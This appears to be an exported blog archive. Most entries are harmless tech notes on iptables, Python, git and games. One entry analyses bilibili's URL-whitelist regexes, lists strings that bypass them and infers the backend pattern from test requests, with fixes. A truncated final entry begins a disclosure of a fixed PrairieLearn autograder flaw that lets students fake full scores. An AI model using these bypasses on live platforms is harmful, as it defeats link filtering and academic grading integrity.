<p>但是，<strong>我们在实际的使用过程中，往往是通过&quot;表&quot;作为操作入****口，对规则进行定义的</strong>，之所以按照上述过程介绍iptables，是因为从&quot;关卡&quot;的角度更容易从入门的角度理解，但是为了以便在实际使用的时候，更加顺畅的理解它们，此处我们还要将各&quot;表&quot;与&quot;链&quot;的关系罗列出来，</p>
<p>表（功能）&lt;--&gt;   链（钩子）：</p>
<p>raw     表中的规则可以被哪些链使用：PREROUTING，OUTPUT</p>
<p>mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p>
<p>nat     表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</p>
<p>filter  表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT</p>
<p>其实我们还需要注意一点，因为数据包经过一个&quot;链&quot;的时候，会将当前链的所有规则都匹配一遍，但是匹配时总归要有顺序，我们应该一条一条的去匹配，而且我们说过，相同功能类型的规则会汇聚在一张&quot;表&quot;中，那么，哪些&quot;表&quot;中的规则会放在&quot;链&quot;的最前面执行呢，这时候就需要有一个优先级的问题，我们还拿prerouting&quot;链&quot;做图示。</p>
<p><img data-src="https://www.zsythink.net/wp-content/themes/begin/img/blank.gif" alt="iptables详解（1）：iptables概念"></p>
<p>prerouting链中的规则存放于三张表中，而这三张表中的规则执行的优先级如下：</p>
<p>raw --&gt; mangle --&gt; nat</p>
<p>但是我们知道，iptables为我们定义了4张&quot;表&quot;,当他们处于同一条&quot;链&quot;时，执行的优先级如下。</p>
<p>优先级次序（由高而低）：</p>
<p>raw --&gt; mangle --&gt; nat --&gt; filter</p>
<p>但是我们前面说过，某些链天生就不能使用某些表中的规则，所以，4张表中的规则处于同一条链的目前只有output链，它就是传说中海陆空都能防守的关卡。</p>
<p>为了更方便的管理，我们还可以在某个表里面创建自定义链，将针对某个应用程序所设置的规则放置在这个自定义链中，但是自定义链接不能直接使用，只能被某个默认的链当做动作去调用才能起作用，我们可以这样想象，自定义链就是一段比较&quot;短&quot;的链子，这条&quot;短&quot;链子上的规则都是针对某个应用程序制定的，但是这条短的链子并不能直接使用，而是需要&quot;焊接&quot;在iptables默认定义链子上，才能被IPtables使用，这就是为什么默认定义的&quot;链&quot;需要把&quot;自定义链&quot;当做&quot;动作&quot;去引用的原因。这是后话，后面再聊，在实际使用时我们即可更加的明白。</p>
<p>   
 </p>
<h2 id="数据经过防火墙的流程"><a href="#数据经过防火墙的流程" class="headerlink" title="数据经过防火墙的流程"></a>数据经过防火墙的流程</h2><p>结合上述所有的描述，我们可以将数据包通过防火墙的流程总结为下图：</p>
<p><img data-src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png" alt="iptables详解（1）：iptables概念"></p>
<p>   
 </p>
<p>我们在写Iptables规则的时候，要时刻牢记这张路由次序图，灵活配置规则。</p>
<p>   
 </p>
<p>我们将经常用到的对应关系重新写在此处，方便对应图例查看。</p>
<p>链的规则存放于哪些表中（从链到表的对应关系）：</p>
<p>PREROUTING   的规则可以存在于：raw表，mangle表，nat表。</p>
<p>INPUT        的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。</p>
<p>FORWARD      的规则可以存在于：mangle表，filter表。</p>
<p>OUTPUT       的规则可以存在于：raw表mangle表，nat表，filter表。</p>
<p>POSTROUTING  的规则可以存在于：mangle表，nat表。</p>
<p>   
 </p>
<p>表中的规则可以被哪些链使用（从表到链的对应关系）：</p>
<p>raw     表中的规则可以被哪些链使用：PREROUTING，OUTPUT</p>
<p>mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p>
<p>nat     表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</p>
<p>filter  表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT</p>
<p>下图中nat表在centos7中的情况就不再标明。</p>
<p>   
 </p>
<p><img data-src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_7.png" alt="iptables详解（1）：iptables概念"></p>
<p>   
 </p>
<h2 id="规则的概念"><a href="#规则的概念" class="headerlink" title="规则的概念"></a>规则的概念</h2><p>说了一圈又说回来了，在上述描述中我们一直在提规则，可是没有细说，现在说说它。</p>
<p>先说说规则的概念，然后再通俗的解释它。</p>
<p>规则：根据指定的匹配条件来尝试匹配每个流经此处的报文，一旦匹配成功，则由规则后面指定的处理动作进行处理；</p>
<p>那么我们来通俗的解释一下什么是iptables的规则，之前打过一个比方，每条&quot;链&quot;都是一个&quot;关卡&quot;，每个通过这个&quot;关卡&quot;的报文都要匹配这个关卡上的规则，如果匹配，则对报文进行对应的处理，比如说，你我二人此刻就好像两个&quot;报文&quot;，你我二人此刻都要入关，可是城主有命，只有器宇轩昂的人才能入关，不符合此条件的人不能入关，于是守关将士按照城主制定的&quot;规则&quot;，开始打量你我二人，最终，你顺利入关了，而我已被拒之门外，因为你符合&quot;器宇轩昂&quot;的标准，所以把你&quot;放行&quot;了，而我不符合标准，所以没有被放行，其实，&quot;器宇轩昂&quot;就是一种&quot;匹配条件&quot;，&quot;放行&quot;就是一种&quot;动作&quot;，&quot;匹配条件&quot;与&quot;动作&quot;组成了规则。</p>
<p>了解了规则的概念，那我们来聊聊规则的组成部分,此处只是大概的将规则的结构列出，后面的文章中会单独对规则进行总结。</p>
<p>规则由匹配条件和处理动作组成。</p>
<h3 id="匹配条件"><a href="#匹配条件" class="headerlink" title="匹配条件"></a>匹配条件</h3><p>匹配条件分为基本匹配条件与扩展匹配条件</p>
<p><strong>基本匹配条件：</strong></p>
<p>源地址Source IP，目标地址 Destination IP</p>
<p>上述内容都可以作为基本匹配条件。</p>
<p><strong>扩展匹配条件：</strong></p>
<p>除了上述的条件可以用于匹配，还有很多其他的条件可以用于匹配，这些条件泛称为扩展条件，这些扩展条件其实也是netfilter中的一部分，只是以模块的形式存在，如果想要使用这些条件，则需要依赖对应的扩展模块。</p>
<p>源端口Source Port, 目标端口Destination Port</p>
<p>上述内容都可以作为扩展匹配条件</p>
<h3 id="处理动作"><a href="#处理动作" class="headerlink" title="处理动作"></a><strong>处理动作</strong></h3><p>处理动作在iptables中被称为target（这样说并不准确，我们暂且这样称呼），动作也可以分为基本动作和扩展动作。</p>
<p>此处列出一些常用的动作，之后的文章会对它们进行详细的示例与总结：</p>
<p><strong>ACCEPT</strong>：允许数据包通过。</p>
<p><strong>DROP</strong>：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</p>
<p><strong>REJECT</strong>：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</p>
<p><strong>SNAT</strong>：源地址转换，解决内网用户用同一个公网地址上网的问题。</p>
<p><strong>MASQUERADE</strong>：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。</p>
<p><strong>DNAT</strong>：目标地址转换。</p>
<p><strong>REDIRECT</strong>：在本机做端口映射。</p>
<p><strong>LOG</strong>：在&#x2F;var&#x2F;log&#x2F;messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>iptables的实际操作我们会另外总结为其他文章，iptables系列文章列表直达链接如下：</p>
<p><a href="https://www.zsythink.net/wp-content/themes/begin/inc/go.php?url=http://www.zsythink.net/archives/tag/iptables/">iptables零基础快速入门系列</a></p>
]]></content>
      <categories>
        <category>系统默认</category>
        <category>转载</category>
      </categories>
  </entry>
  <entry>
    <title>Python input function not work properly in linux</title>
    <url>/articles/blogarchive/2019-10-06-21-01-22/</url>
    <content><![CDATA[<p>When I am writing a backup program for my minecraft server using python.</p>
<p>I find that when I want to use press backspace or arrow key, the input will not work properly.</p>
<p>Instead, it shows strange character like.</p>
<p><img data-src="/images/20201124strange.png" alt="strange character"></p>
<p>the solution is very simple</p>
<p>add <code>import readline</code> at the begining of the code will automatically fix the problem</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>change git password in idea</title>
    <url>/articles/blogarchive/2019-10-26-21-00-50/</url>
    <content><![CDATA[<p>in terminal</p>
<p>type</p>
<p>git fetch</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>jetbrain</tag>
      </tags>
  </entry>
  <entry>
    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
    <url>/articles/blogarchive/2019-10-29-17-03-47/</url>
    <content><![CDATA[<h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><p>Some people may find that paradox games such as Heart of Iron will crash on windows 10.</p>
<p>According to the steam page, paradox games often require directX 9.0c as the running time. </p>
<p>However, since windows 10 doesn&#39;t support directX anymore. And windows 10 pre-install with directX 11. The games can&#39;t run properly.</p>
<hr>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol>
<li><p>go to <a href="https://blog.csdn.net/VBcom/article/details/9140197">https://blog.csdn.net/VBcom/article/details/9140197</a> and download the <strong>DirectX repair</strong></p>
</li>
<li><p>run the application and restart your computer.</p>
</li>
</ol>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
      <tags>
        <tag>solution</tag>
        <tag>game</tag>
      </tags>
  </entry>
  <entry>
    <title>简析b站关于站内链接的正则匹配</title>
    <url>/articles/blogarchive/2020-08-04-16-05-57/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文由 <a href="https://blog.boxpaper.club/">@Rorical</a> 的文章<a href="https://blog.boxpaper.club/archives/72/">《优雅的在哔哩哔哩评论区发送链接》</a>启发，目的在于学习正则匹配的基本技巧。</p>
<p>本文将用介绍简单的正则匹配，并通过站内链接的正则匹配作为例子进行讲解。</p>
<span id="more"></span>

<p>阅读本文时可以参照: <a href="https://www.runoob.com/regexp/regexp-syntax.html">https://www.runoob.com/regexp/regexp-syntax.html</a> 来帮助理解</p>
<hr>
<h3 id="什么是正则匹配"><a href="#什么是正则匹配" class="headerlink" title="什么是正则匹配"></a>什么是正则匹配</h3><blockquote>
<p>正则表达式(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为&quot;元字符&quot;）。</p>
</blockquote>
<blockquote>
<p>正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。</p>
</blockquote>
<blockquote>
<p>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
</blockquote>
<blockquote>
<p>Credit: <a href="https://www.runoob.com/regexp/regexp-tutorial.html">https://www.runoob.com/regexp/regexp-syntax.html</a></p>
</blockquote>
<p>简单来说，正则匹配就是一串可以匹配具有特定格式的字符。</p>
<p>例如</p>
<p>runoo+b，可以匹配 runoob、runooob、runoooooob 等，+ 号代表前面的字符必须至少出现一次（1次或多次）。</p>
<p>runoo<em>b，可以匹配 runob、runoob、runoooooob 等，</em> 号代表前面的字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）。</p>
<p>colou?r 可以匹配 color 或者 colour，? 问号代表前面的字符最多只可以出现一次（0次、或1次）。</p>
<p>Credit: <a href="https://www.runoob.com/regexp/regexp-syntax.html">https://www.runoob.com/regexp/regexp-syntax.html</a></p>
<hr>
<h3 id="Part1-专栏投稿中站内链接的正则匹配"><a href="#Part1-专栏投稿中站内链接的正则匹配" class="headerlink" title="Part1-专栏投稿中站内链接的正则匹配"></a>Part1-专栏投稿中站内链接的正则匹配</h3><p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/531e4e056de5c49ea2f4d3c2314acfa00d504d07.png" alt="站内链接-正则匹配-0.js"></p>
<p>通过简单的搜索，可以发现专栏投稿中共有如下4条正则匹配规则（cdn的正则略过）</p>
<pre>
1.^(http:)?(https:)?(\/\/)?((([a-zA-Z0-9_-])+(\.)?){1,2}\.)?(bilibili.com)+(:\d+)?(\/((\.)?(\?)?=?&?%?[#!a-zA-Z0-9_-](\?)?)*)*$

2.^(http:)?(https:)?(\/\/)?(([a-zA-Z0-9_-])+(\.)?){0,2}(\.biligame.com)+(:\d+)?(\/((\.)?(\?)?=?&?%?[#!a-zA-Z0-9_-](\?)?)*)*$/i

3.^(http:)?(https:)?(\/\/)?(acg.tv)+(:\d+)?(\/((\.)?(\?)?=?&?%?[#!a-zA-Z0-9_-](\?)?)*)*$

4.^(bilibili:\/\/)(\S)+$
</pre>

<p>在这部分里，本文将由简单到复杂，以倒序的方式逐条进行说明。</p>
<p><code>^(bilibili:\/\/)(\S)+$</code></p>
<p>首先看几个基础组成部分</p>
<pre>
^ - 字符串必须由该正则匹配开始

$ - 字符串必须由该正则匹配结束

() - 代表一个子表达式

\ - 代表转义符号，跟在\后面的字符不代表任何含义 例如 \^ 就代表 ^, 使^失去了作用.

\S - 非打印字符，匹配任何非空白字符

+ - 匹配前面的子表达式一次或多次 （至少匹配前面的一次）
</pre>

<p>那么该表达式代表的意思就是</p>
<p>必需由 bilibili:&#x2F;&#x2F; 开始，后面跟上至少一次或多次的任意字符。</p>
<p>例如 bilibili:&#x2F;&#x2F;oasidhjfjkasfnkhj</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/667c04a96c41bf373a5981d816e5cf992f37b156.png" alt="bilibili://oasidhjfjkasfnkhj"></p>
<p>无法匹配的，比如不是由bilibili:&#x2F;&#x2F;开头的, abilibili:&#x2F;&#x2F;adfasdfasf</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/49270329753c237523ab4105bb96ba1f305eb011.png" alt="abilibili://adfasdfasf"></p>
<hr>
<p><code>^(http:)?(https:)?(\/\/)?(acg.tv)+(:\d+)?(\/((\.)?(\?)?=?&amp;?%?[#!a-zA-Z0-9_-](\?)?)*)*$</code></p>
<p>同样先把基础部分标一下</p>
<pre>
? - 代表匹配0次或者一次 (最多匹配一次)

\d - 代表匹配数字

[] - 代表可以匹配的字符，例如[0123456789]代表可以匹配任意一个数字，[0123456789]等同于[0-9]等同于\d
</pre>

<p>然后是是解析</p>
<p><code>(http:)?(https:)?(\/\/)?</code> 代表至多匹配 http: , https: , &#x2F;&#x2F; 各1次</p>
<p><code>(acg.tv)+</code> 代表匹配 acg.tv 至少一次 </p>
<p><code>(:\d+)?</code> 代表 :数字 例如 :80 :99(其实就是端口号)，出现0次或者1次，</p>
<p><code>(\/((\.)?(\?)?=?&amp;?%?[#!a-zA-Z0-9_-](\?)?)*)*$</code> 代表 匹配以&#x2F;开头的任意字符或者干脆没有(讲起来太麻烦了)</p>
<p>该正则的本意是匹配例如 acg.tv&#x2F;BV1oA411v7fp 的网址，但实际上却可以匹配很多根本不是网址的字符串。</p>
<p>比如http: 那里只写了至多能匹配一次，没写互斥。acg.tv只写了至少匹配一次.所以可能会出现如下情况</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/e7bddac56200eb3ca42ccb5bd83ee02a0f0b45e2.png" alt="acg.tv bypass 1"></p>
<p>可能的解决方式: <code>^((http(s)?:\/\/)|(\/\/))?(acg.tv)(:\d+)?(\/((\.)?(\?)?=?&amp;?%?[#!a-zA-Z0-9_-](\?)?)*)*$</code></p>
<hr>
<p><code>^(http:)?(https:)?(\/\/)?(([a-zA-Z0-9_-])+(\.)?)&#123;0,2&#125;(\.biligame.com)+(:\d+)?(\/((\.)?(\?)?=?&amp;?%?[#!a-zA-Z0-9_-](\?)?)*)*$</code></p>
<p>重复的不再说明了</p>
<pre>
{n,m} -  m 和 n 均为非负整数，其中n <= m。最少匹配 n 次且最多匹配 m 次。
</pre>

<p><code>(([a-zA-Z0-9_-])+(\.)?)&#123;0,2&#125;</code> 代表 (匹配任意字符最少一次+0个或者1个点)，并且该子表达式最多匹配两次最少不匹配。</p>
<p>比如 a.a. , ab.a , a. 等可以都匹配。但是 a.a.a.就不行了。说白了就是想要匹配子域名，且最多匹配到3级子域名。</p>
<p>该正则的本意是匹配biligame.com旗下的网站已经其2&#x2F;3级子域名。</p>
<p>例如 <a href="https://www.biligame.com/detail/?id=101772">https://www.biligame.com/detail/?id=101772</a> 。</p>
<p>但是实际怎么就不用我多说了吧。先不提前文提到的http:</p>
<p>其他的比如</p>
<p>a.a..biligame.com 都可以出现超链接。</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a78e2fdb68bfdda17e00bce8f34caa97cee4cb69.png" alt="biligame bypass 1"></p>
<p>还有更奇妙的是</p>
<p>biligame.com 居然是非法链接。</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/1e69aa374905b67ab43a1778eefe131f47351b97.png" alt="我人傻了"></p>
<p>可能的解决方式: <code>^((http(s)?:\/\/)|(\/\/))?([a-zA-Z0-9_-]+\.)&#123;0,2&#125;(biligame.com)(:\d+)?(\/((\.)?(\?)?=?&amp;?%?[#!a-zA-Z0-9_-](\?)?)*)*$</code></p>
<hr>
<p><code>^(http:)?(https:)?(\/\/)?((([a-zA-Z0-9_-])+(\.)?)&#123;1,2&#125;\.)?(bilibili.com)+(:\d+)?(\/((\.)?(\?)?=?&amp;?%?[#!a-zA-Z0-9_-](\?)?)*)*$</code></p>
<p>这个没啥新的好说了，基本和上一个一致</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/1a8f5c6d9b3e397a0ce1d28dbc17ea24f25301e0.png" alt="bilibili.com bypass 1"></p>
<p>可能的解法: <code>^((http(s)?:\/\/)|(\/\/))?([a-zA-Z0-9_-]+\.)&#123;0,2&#125;(bilibili.com)(:\d+)?(\/((\.)?(\?)?=?&amp;?%?[#!a-zA-Z0-9_-](\?)?)*)*$</code></p>
<hr>
<h3 id="Part2-评论区中站内链接的正则匹配"><a href="#Part2-评论区中站内链接的正则匹配" class="headerlink" title="Part2-评论区中站内链接的正则匹配"></a>Part2-评论区中站内链接的正则匹配</h3><p>详情参照<a href="https://blog.boxpaper.club/">@Rorical</a> 的文章<a href="https://blog.boxpaper.club/archives/72/">《优雅的在哔哩哔哩评论区发送链接》</a></p>
<p>评论区有个功能，就是自动把b站的官方链接直接变成超链接(蓝链)，这样就可以直接点链接跳转了。</p>
<p>判断是否为官方链接的代码依旧写死在commet.js里。</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/e0cd7f12c787006ee760ed220fa6c2fdfed5b884.png" alt="regex in commet"></p>
<p><code>(http(s)?:\/\/)?([a-z0-9A-Z]+.)?(bilibili.(com|tv|cn)|biligame.(com|cn)|(bilibiliyoo|im9).com|biliapi.net|b23.tv|sugs.suning.com|kaola.com)(\$|\/|)([\/.$*?~=#!%@&amp;-A-Za-z0-9_]*)(?![^&lt;&gt;]*&gt;|[^&quot;]*?&lt;\/a)</code></p>
<pre>
. - 代表任意字符
</pre>

<p>先说几个没问题的</p>
<p><code>(http(s)?:\/\/)?</code> 匹配http:&#x2F;&#x2F;或者https:&#x2F;&#x2F; 最多一次</p>
<p><code>([/.$*?~=#!%@&amp;-A-Za-z0-9_]*)(?![^&lt;&gt;]*&gt;|[^&quot;]*?&lt;\/a)</code> 代表匹配任意字符</p>
<p>然后就是有问题的</p>
<p><code>(\$|\/|)</code> 代表匹配 $ 或者 &#x2F; 或者 空值, 但是谁会去匹配一个 $ 啊，外星人嘛？</p>
<p>该表达式的本意是要么有&#x2F;匹配后面路径，要么没有&#x2F;，不匹配后面路径。</p>
<p>但是不知道哪个弱智程序员居然把$转义了，导致$根本不能起到本应该有的作用。</p>
<p>另外 这边还有另外一个错误，在后面会用到，就是 | 了一个空值，就是说啥都不匹配也行。</p>
<p>这段就直接相当于 <code>(\$|\/)?</code> 这又加个bug。</p>
<p>接下来就是大问题了</p>
<p>包括<code>([a-z0-9A-Z]+.)?</code> 和 <code>(bilibili.(com|tv|cn)|biligame.(com|cn)|(bilibiliyoo|im9).com|biliapi.net|b23.tv|sugs.suning.com|kaola.com)</code>在内的所有.都没有转义</p>
<p>就拿第一个来说</p>
<p><code>([a-z0-9A-Z]+.)?</code> 匹配一串字符+一个 . ，最多一次。</p>
<p>同时，因为 . 代表任意字符, 所以该子表达式就几乎等同于 <code>([a-z0-9A-Z]&#123;1,&#125;)?</code></p>
<p>也就是说，要么匹配两个以上的任意字符，要么不匹配。</p>
<p>但是该子表达式的本意匹配一个二级域名或者不匹配二级域名， .的不转义导致该表达式失去效果。</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/48961f4937f3610fafdc154cf75004b9a3c8f7c0.png" alt="commet bypass 2"></p>
<p>这里，可以直接用一级域名做个跳转就能实现蓝链接。</p>
<p>再看下一段，同样是.没有转义。举个例子 bilibili.com, 那么符合规则的就不止一个bilibili.com了 bilibili0com bilibiliacom bilibilibcom bilibili0com 都是可以的</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/494220f1ce4c2562088c1ea201ea0f9915c971bf.png" alt="commet bypass 3"></p>
<p>这个时候，利用这边的漏洞以及上面一个可以不匹配的漏洞，可以轻松构造出一个能够被匹配的二级域名。</p>
<p><img data-src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/82773ff538ac99b7841647cbf2ad2059a53652ce.png" alt="commet bypass 4 aabilibili0com.a.a/fadfasd?a=afda"></p>
<p>这样子的话，用二级域名直接做个跳转就能实现蓝链接跳转了。</p>
<p>当然照惯例，给出修复方法: <code>(http(s)?:\/\/)?([a-z0-9A-Z]+\.)?(bilibili\.(com|tv|cn)|biligame\.(com|cn)|(bilibiliyoo|im9)\.com|biliapi\.net|b23\.tv|sugs\.suning\.com|kaola\.com)($|\/)([/.$*?~=#!%@&amp;-A-Za-z0-9_]*)(?![^&lt;&gt;]*&gt;|[^&quot;]*?&lt;\/a)</code></p>
<hr>
<h3 id="Part3-进阶-后端正则匹配的猜解"><a href="#Part3-进阶-后端正则匹配的猜解" class="headerlink" title="Part3-进阶-后端正则匹配的猜解"></a>Part3-进阶-后端正则匹配的猜解</h3><p>这段内容中，本文将简单介绍如何猜解b23.tv短链接后端中的正则匹配。</p>
<pre>
POST /x/share/click?build=9333&buvid=db234615f49c5ca155cc50d6c04bb700&oid=https://www.bilibili.com&platform=ios&share_channel=COPY&share_content=123&share_id=public.webview.0.0.pv&share_mode=1&share_origin=&share_title=123&sid= HTTP/1.1
User-Agent: PostmanRuntime/7.26.2
Accept: */*
Cache-Control: no-cache
Postman-Token: 66c47e9c-74d6-4a48-933c-12fcdd8d4f22
Host: api.bilibili.com
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: 
Content-Length: 0
</pre>

<p>尝试 <a href="https://www.bilibili.com/">https://www.bilibili.com</a> -&gt; 成功</p>
<p>尝试 <a href="https://www.biligame.com/">https://www.biligame.com</a> -&gt; 成功</p>
<p>尝试 <a href="https://www.im9.com/">https://www.im9.com</a> -&gt; 成功</p>
<p>尝试 <a href="https://www.biliapi.net/">https://www.biliapi.net</a> -&gt; 成功</p>
<p>尝试 <a href="https://www.bilibili.co/">https://www.bilibili.co</a> -&gt; 成功</p>
<p>尝试 <a href="https://aabilibili0com/">https://aabilibili0com</a> -&gt; 成功, 说明没有转义.</p>
<p>可以首先构建出一段子表达式<code>(bilibili.com|biligame.com|im9.com|biliapi.net|bilibili.co)</code></p>
<p>尝试 <a href="https://www.bilibili.com/">https://www.bilibili.com</a> -&gt; 成功</p>
<p>尝试 <a href="https://a.a.a.a.a.bilibili.com/">https://a.a.a.a.a.bilibili.com</a> -&gt; 成功</p>
<p>尝试 <a href="http://www.bilibili.com/">www.bilibili.com</a> -&gt; 失败</p>
<p>尝试 <a href="https://bilibili.com/">https://bilibili.com</a> -&gt; 失败</p>
<p>尝试 http:<a href="https://www.bilibili.com/">https://www.bilibili.com</a> -&gt; 失败</p>
<p>由此可以推断出，后端的正则匹配必须有http或者https以及一个二级域名</p>
<p>结合上一段，构建出子表达式</p>
<p><code>^(http(s)?:\/\/)([a-z0-9A-Z]+.)+(bilibili.com|biligame.com|im9.com|biliapi.net|bilibili.co)</code></p>
<p>接下来尝试2级域名</p>
<p>尝试 <a href="https://aabilibili0com.a.a/">https://aabilibili0com.a.a</a> -&gt; 失败</p>
<p>尝试 <a href="https://aabilibili0com/.a.a">https://aabilibili0com/.a.a</a> -&gt; 成功</p>
<p>尝试 <a href="https://aabilibili0com/">https://aabilibili0com</a> -&gt; 成功</p>
<p>尝试 <a href="https://aabilibili0com/">https://aabilibili0com/</a> -&gt; 成功</p>
<p>由此构建子表达式</p>
<p> <code>($|\/)([\/.$*?~=#!%@&amp;-A-Za-z0-9_]*)(?![^&lt;&gt;]*&gt;|[^&quot;]*?&lt;\/a)</code></p>
<p>结合起来 推测后端正则表达式为</p>
<p><code>^(http(s)?:\/\/)([a-z0-9A-Z]+.)+(bilibili.com|biligame.com|im9.com|biliapi.net|bilibili.co)($|\/)([\/.$*?~=#!%@&amp;-A-Za-z0-9_]*)(?![^&lt;&gt;]*&gt;|[^&quot;]*?&lt;\/a)</code></p>
<p>那么，要绕过后端只有一种办法，就是买个域名。例如</p>
<pre>
https://www.aabilibili.com
https://www.asd123fbilibili.com
https://www.aaim9.com
https://www.1254im9.com
https://www.vcxzdfaim9.com
https://www.123fgadsbilibili.com
https://www.bsfdvbsbilibili.com
</pre>

<p>解决办法类似评论区</p>
<p><code>^(http(s)?:\/\/)([a-z0-9A-Z]+\.)+(bilibili\.com|biligame\.com|im9\.com|biliapi\.net|bilibili\.co)($|\/)([\/.$*?~=#!%@&amp;-A-Za-z0-9_]*)(?![^&lt;&gt;]*&gt;|[^&quot;]*?&lt;\/a)</code></p>
]]></content>
      <categories>
        <category>Programming</category>
        <category>原创</category>
      </categories>
      <tags>
        <tag>bilibili</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>Breaking PrairieLearn Java Grader</title>
    <url>/articles/ctf/breaking-prairielearn-java-grader/</url>
    <content><![CDATA[<h1 id="PrairieLearn-Java-Autograder-Vulnerability"><a href="#PrairieLearn-Java-Autograder-Vulnerability" class="headerlink" title="PrairieLearn Java Autograder Vulnerability"></a>PrairieLearn Java Autograder Vulnerability</h1><p>Aynakeya <a href="mailto:&#97;&#121;&#x6e;&#97;&#x6b;&#x65;&#121;&#97;&#46;&#x6f;&#x66;&#x66;&#105;&#x63;&#105;&#97;&#108;&#x40;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#97;&#121;&#x6e;&#97;&#x6b;&#x65;&#121;&#97;&#46;&#x6f;&#x66;&#x66;&#105;&#x63;&#105;&#97;&#108;&#x40;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a></p>
<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>This is a walkthrough of one vulnerability I found in PrairieLearn Java autograder. </p>
<p>The default Java autograder exists vulnerabilities that allow user to leak information and write files to the container.</p>
<p>These vulnerabilities allow the user to modify the result of autograder score and get 100% without writing any actual code.</p>
<p>Vulnerability has been fixed in commit <a href="https://github.com/PrairieLearn/PrairieLearn/commit/7871ce577db146f9b1ee765735b8d70848129477">7871ce5</a></p>
<p><del>Since the vulnerability hasn&#39;t been fixed yet. Anyone who read this document should not disclose the content of the vulnerability</del></p>
<p><del>to public in any form until the vulnerability is fixed and deployed to production.</del></p>
<span id="more"></span>

<h1 id="Basic-Idea"><a href="#Basic-Idea" class="headerlink" title="Basic Idea"></a>Basic Idea</h1><p><a href="https://github.com/PrairieLearn/PrairieLearn/blob/d105286fc0b287bc57b3553bd52196d14e704fd8/graders/java/autograder.sh">autograder.sh</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="title">exception</span></span>() &#123;</span><br><span class="line">    jq -n --arg msg <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&#x27;&#123;gradable: false, message: $msg&#125;&#x27;</span> &gt; <span class="variable">$RESULTS_FILE</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">RESULTS_TEMP_DIR=$(<span class="built_in">mktemp</span> -d -p /grade/results)</span><br><span class="line">RESULTS_TEMP_FILE=<span class="string">&quot;<span class="variable">$RESULTS_TEMP_DIR</span>/<span class="variable">$RANDOM</span>.json&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">java -<span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span> JUnitAutograder <span class="string">&quot;<span class="variable">$RESULTS_TEMP_FILE</span>&quot;</span> <span class="string">&quot;<span class="variable">$TEST_FILES</span>&quot;</span> <span class="string">&quot;<span class="variable">$STUDENT_COMPILE_OUT</span>&quot;</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$RESULTS_TEMP_FILE</span> ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mv</span> <span class="variable">$RESULTS_TEMP_FILE</span> <span class="variable">$RESULTS_FILE</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    exception <span class="string">&quot;No grading results could be retrieved.</span></span><br><span class="line"><span class="string">This usually means your program crashed before results could be saved.</span></span><br><span class="line"><span class="string">The most common cause is a call to 